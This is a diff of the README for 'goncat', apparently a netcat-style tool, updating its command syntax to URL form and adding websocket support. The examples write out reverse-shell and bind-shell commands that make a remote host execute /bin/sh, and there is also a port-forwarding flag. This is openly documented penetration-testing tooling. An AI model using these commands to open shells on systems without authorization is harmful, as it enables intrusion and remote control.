@@ -32,15 +32,17 @@ There is only one binary combining all features and it works cross-platform.
 A few examples to illustrate basic use, which all assume a goncat binary exists on both your own machine and a remote one:
 
 *   Reverse shell
-    *   On your machine: `goncat master listen --port 12345 --exec /bin/sh` to create a listener on port 12345 that will instruct the other end to execute `/bin/sh`.
-    *   Remote: `goncat slave connect --host 11.22.33.44 --port 12345` to connect the remote side as a slave, which will execute `/bin/sh`.
+    *   On your machine: `goncat master listen 'tcp://*:12345' --exec /bin/sh` to create a listener on port 12345 that will instruct the other end to execute `/bin/sh`.
+    *   Remote: `goncat slave connect tcp://11.22.33.44:12345` to connect the remote side as a slave, which will execute `/bin/sh`.
 *   Bind shell
-    *   Remote: `goncat slave listen --port 12345` to listen in port 12345 for connections. The listener will do whatever a connecting master asks it to.
-    *   On your machine: `goncat master connect --host 55.66.77.88 --port 12345 --exec /bin/sh` to connect to the remote host and make it execute `/bin/sh`.
+    *   Remote: `goncat slave listen 'tcp://*:12345'` to listen in port 12345 for connections. The listener will do whatever a connecting master asks it to.
+    *   On your machine: `goncat master connect tcp://55.66.77.88:12345 --exec /bin/sh` to connect to the remote host and make it execute `/bin/sh`.
+
+Supported protocols include `tcp` (plain TCP connection) as well as `ws` and `wss` (websocket connections).
 
 Advanced features can be enabled with additional flags:
 
-*   Encryption: add `--ssl` on both ends to enable TLS
+*   Encryption: add `--ssl` on both ends to enable TLS encryption, which applies to all connections regardless of the protocol
 *   Authentication: add `--key mypassword` on both ends to ensure no unexpected clients can connect (requires `--ssl`)
 *   PTY: as master, add `--pty` to get a fully interactive shell (make sure you also execute a shell with `--exec`)
 *   Local TCP port forwarding: as master, add `-L 8443:google.com:443` to open a local port 8443 on the master side, any connection to it will
